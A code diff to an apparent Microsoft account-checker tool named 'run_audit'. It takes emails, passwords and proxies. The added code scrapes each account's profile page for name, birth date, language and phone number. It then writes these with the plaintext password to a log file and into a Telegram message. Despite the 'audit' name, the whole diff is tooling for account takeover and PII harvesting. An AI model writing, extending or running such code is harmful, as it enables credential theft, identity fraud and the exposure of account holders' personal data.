@@ -438,6 +438,7 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
     }
 
     name, country = "N/A", "N/A"
+    dob, language, phone = "N/A", "N/A", "N/A"
     try:
         res_prof = session.get(
             "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
@@ -456,53 +457,58 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                 if country and '-' in country:
                     country = country.split('-')[-1].upper()
                     
-            # Fallback 3: Scrape Microsoft Account Profile Page (100% Accuracy for old accounts)
-            if country == "N/A" or not country or country == "XZ":
-                try:
-                    profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
-                    if profile_html_res.status_code == 200:
-                        # Extract the React JSON blob embedded in the page
-                        html_text = profile_html_res.text
-                        country_match = re.search(r'"Country"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                        if not country_match:
-                            country_match = re.search(r'"CountryOrRegion"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                        if country_match:
-                            raw_country = country_match.group(1)
-                            # Convert full country name back to 2-letter ISO code or just use the first 4 letters
-                            country = raw_country[:4].upper() if len(raw_country) > 2 else raw_country.upper()
-                except Exception as e:
-                    pass
+        # Deep Scrape: Microsoft Account Profile Page
+        try:
+            profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
+            if profile_html_res.status_code == 200:
+                html_text = profile_html_res.text
                 
-            # Fallback 4: TLD Extraction forcing 100% resolution if HTML scrape fails
-            if country == "N/A" or not country or country == "XZ":
-                email_lower = email.lower()
-                if email_lower.endswith('.es'): country = 'ES'
-                elif email_lower.endswith('.mx') or email_lower.endswith('.com.mx'): country = 'MX'
-                elif email_lower.endswith('.ar') or email_lower.endswith('.com.ar'): country = 'AR'
-                elif email_lower.endswith('.co') or email_lower.endswith('.com.co'): country = 'CO'
-                elif email_lower.endswith('.cl') or email_lower.endswith('.com.cl'): country = 'CL'
-                elif email_lower.endswith('.pe') or email_lower.endswith('.com.pe'): country = 'PE'
-                elif email_lower.endswith('.ve') or email_lower.endswith('.com.ve'): country = 'VE'
-                elif email_lower.endswith('.ec') or email_lower.endswith('.com.ec'): country = 'EC'
-                elif email_lower.endswith('.gt') or email_lower.endswith('.com.gt'): country = 'GT'
-                elif email_lower.endswith('.cr') or email_lower.endswith('.co.cr'): country = 'CR'
-                elif email_lower.endswith('.do') or email_lower.endswith('.com.do'): country = 'DO'
-                elif email_lower.endswith('.uy') or email_lower.endswith('.com.uy'): country = 'UY'
-                elif email_lower.endswith('.br') or email_lower.endswith('.com.br'): country = 'BR'
-                elif email_lower.endswith('.it'): country = 'IT'
-                elif email_lower.endswith('.fr'): country = 'FR'
-                elif email_lower.endswith('.de'): country = 'DE'
-                elif email_lower.endswith('.uk') or email_lower.endswith('.co.uk'): country = 'UK'
-                else: 
-                    country = 'US'
+                if name == "N/A" or not name:
+                    m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                    if m: name = m.group(1)
                 
-            emit_event(q, "step_pass", {"step": 6, "detail": f"{name} | {country}"})
-        else:
-            emit_event(q, "step_pass", {"step": 6, "detail": f"Email: {email}"})
+                m = re.search(r'"(?:Country|CountryOrRegion)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                if m: country = m.group(1).upper()
+                    
+                m = re.search(r'"(?:BirthDate|DateOfBirth|dob)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                if m: dob = m.group(1)
+                        
+                m = re.search(r'"(?:Language|Locale)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                if m: language = m.group(1)
+
+                phone_matches = re.findall(r'"ProofName"\s*:\s*"(\+\d+[^"]+)"', html_text, re.IGNORECASE)
+                if not phone_matches: phone_matches = re.findall(r'"PhoneNumber"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                if phone_matches: phone = phone_matches[0]
+        except Exception:
+            pass
+                
+        # Fallback TLD
+        if country == "N/A" or not country or country == "XZ":
+            email_lower = email.lower()
+            if email_lower.endswith('.es'): country = 'ES'
+            elif email_lower.endswith('.mx') or email_lower.endswith('.com.mx'): country = 'MX'
+            elif email_lower.endswith('.ar') or email_lower.endswith('.com.ar'): country = 'AR'
+            elif email_lower.endswith('.co') or email_lower.endswith('.com.co'): country = 'CO'
+            elif email_lower.endswith('.cl') or email_lower.endswith('.com.cl'): country = 'CL'
+            elif email_lower.endswith('.pe') or email_lower.endswith('.com.pe'): country = 'PE'
+            elif email_lower.endswith('.ve') or email_lower.endswith('.com.ve'): country = 'VE'
+            elif email_lower.endswith('.ec') or email_lower.endswith('.com.ec'): country = 'EC'
+            elif email_lower.endswith('.gt') or email_lower.endswith('.com.gt'): country = 'GT'
+            elif email_lower.endswith('.cr') or email_lower.endswith('.co.cr'): country = 'CR'
+            elif email_lower.endswith('.do') or email_lower.endswith('.com.do'): country = 'DO'
+            elif email_lower.endswith('.uy') or email_lower.endswith('.com.uy'): country = 'UY'
+            elif email_lower.endswith('.br') or email_lower.endswith('.com.br'): country = 'BR'
+            elif email_lower.endswith('.it'): country = 'IT'
+            elif email_lower.endswith('.fr'): country = 'FR'
+            elif email_lower.endswith('.de'): country = 'DE'
+            elif email_lower.endswith('.uk') or email_lower.endswith('.co.uk'): country = 'UK'
+            else: country = 'US'
+            
+        emit_event(q, "step_pass", {"step": 6, "detail": f"{name[:15]} | {country} | {phone}"})
     except:
         emit_event(q, "step_pass", {"step": 6, "detail": f"Email: {email}"})
 
-    emit_event(q, "profile", {"name": name, "country": country})
+    emit_event(q, "profile", {"email": email, "name": name, "country": country, "dob": dob, "language": language, "phone": phone})
 
     # ══════════════════════════════════════════════════
     # PASO 7 — Búsqueda DLP (Bearer token, no cookies)
@@ -709,8 +715,9 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
 ")
                 gf.write(f"🔑 Pass: {password}\
 ")
-                gf.write(f"🌍 País: {country} | Nombre: {name}\
-")
+                gf.write(f"🌍 País: {country} | Nombre: {name}\n")
+                gf.write(f"📅 DOB: {dob} | Idioma: {language}\n")
+                gf.write(f"📱 Teléfono: {phone}\n")
                 gf.write(f"📊 Total Encontrados: {t_found}\
 ")
                 gf.write("="*40 + "\
@@ -740,6 +747,9 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                     "pass": password,
                     "country": country,
                     "name": name,
+                    "dob": dob,
+                    "language": language,
+                    "phone": phone,
                     "total": t_found,
                     "query": s_query,
                     "chat_id": chat_id
@@ -758,9 +768,11 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                               f"📧 *Correo:* `{email}`\
 🔑 *Pass:* `{password}`\
 "
-                              f"🌍 *País:* {country}\
-👤 *Nombre:* {name}\
-"
+                              f"🌍 *País:* {country}\n"
+                              f"👤 *Nombre:* {name}\n"
+                              f"📅 *DOB:* {dob}\n"
+                              f"🗣️ *Idioma:* {language}\n"
+                              f"📱 *Teléf:* `{phone}`\n"
                               f"📊 *Mensajes:* `{t_found}`\
 🔍 *Búsqueda:* `{s_query}`\
 "
